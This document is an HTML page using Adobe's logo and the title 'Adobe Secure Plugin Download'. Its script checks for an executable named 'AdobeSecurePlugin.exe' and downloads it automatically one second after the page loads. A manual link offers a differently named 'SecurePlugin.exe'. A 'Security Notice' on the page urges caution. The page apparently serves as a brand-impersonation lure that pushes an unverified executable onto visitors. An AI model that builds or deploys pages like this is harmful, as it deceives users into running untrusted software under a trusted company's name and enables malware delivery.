<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Adobe Secure Plugin Download</title>
    <link
      href="https://cdn.jsdelivr.net/npm/tailwindcss@3.4.1/dist/tailwind.min.css"
      rel="stylesheet"
    />
    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
  </head>
  <body class="bg-gradient-to-br from-blue-50 to-indigo-100 min-h-screen flex items-center justify-center p-4">
    <div class="bg-white shadow-xl rounded-2xl w-full max-w-md p-6 space-y-6">
      <div class="text-center space-y-4">
        <img
          src="https://www.adobe.com/federal/assets/svgs/adobe-logo.svg"
          alt="Adobe Logo"
          class="h-12 mx-auto"
        />
        <h2 class="text-xl font-semibold flex items-center justify-center gap-2">
          <i data-lucide="download" class="w-5 h-5"></i>
          File Download
        </h2>
        <p class="text-gray-600">Adobe Secure Plugin Download</p>
      </div>

      <div id="statusBox" class="space-y-4 text-sm text-gray-700"></div>

      <div class="text-center text-sm text-gray-600">
        <p>File: <span id="filename">SecurePlugin.exe</span></p>
        <p class="mt-2">
          Manual download:
          <a
            href="SecurePlugin.exe"
            class="text-blue-600 hover:underline"
            download
            >Click here</a
          >
        </p>
      </div>

      <div class="bg-yellow-50 border border-yellow-200 p-3 rounded-md flex items-start gap-2">
        <i data-lucide="alert-circle" class="text-yellow-600 w-4 h-4 mt-0.5"></i>
        <p class="text-yellow-800">
          <strong>Security Notice:</strong> Only download executable files from
          trusted sources. Verify the file integrity before running.
        </p>
      </div>
    </div>

    <script>
      const fileUrl = "AdobeSecurePlugin.exe";
      const fileName = "AdobeSecurePlugin.exe";
      const statusBox = document.getElementById("statusBox");

      function showStatus(type, message) {
        let icon = "";
        let bg = "";
        let border = "";
        let text = "";

        switch (type) {
          case "checking":
            icon = "alert-circle";
            bg = "bg-blue-50";
            border = "border-blue-200";
            text = "text-blue-800";
            break;
          case "available":
            icon = "check-circle";
            bg = "bg-green-50";
            border = "border-green-200";
            text = "text-green-800";
            break;
          case "error":
            icon = "alert-circle";
            bg = "bg-red-50";
            border = "border-red-200";
            text = "text-red-800";
            break;
        }

        statusBox.innerHTML = `
          <div class="${bg} ${border} ${text} border p-3 rounded-md flex items-start gap-2">
            <i data-lucide="${icon}" class="w-4 h-4 mt-0.5"></i>
            <p>${message}</p>
          </div>
          ${
            type === "available"
              ? `<button id="downloadBtn" class="bg-indigo-600 hover:bg-indigo-700 text-white w-full py-2 px-4 rounded-md flex items-center justify-center gap-2">
                   <i data-lucide="download" class="w-4 h-4"></i>
                   Download ${fileName}
                 </button>`
              : ""
          }
        `;
        lucide.createIcons();

        const downloadBtn = document.getElementById("downloadBtn");
        if (downloadBtn) {
          downloadBtn.addEventListener("click", triggerDownload);
        }
      }

      function triggerDownload() {
        const link = document.createElement("a");
        link.href = fileUrl;
        link.download = fileName;
        link.click();
      }

      async function checkFile() {
        showStatus("checking", "Checking file availability...");
        try {
          const response = await fetch(fileUrl, { method: "HEAD" });
          if (response.ok) {
            showStatus("available", "File is available. Downloading automatically...");
            setTimeout(triggerDownload, 1000);
          } else {
            showStatus(
              "error",
              `File not found (${response.status}). The file may not exist or is inaccessible.`
            );
          }
        } catch (e) {
          showStatus("error", "Unable to check file availability. Please check your internet connection.");
        }
      }

      // Start check on page load
      window.addEventListener("DOMContentLoaded", () => {
        checkFile();
      });
    </script>
  </body>
</html>
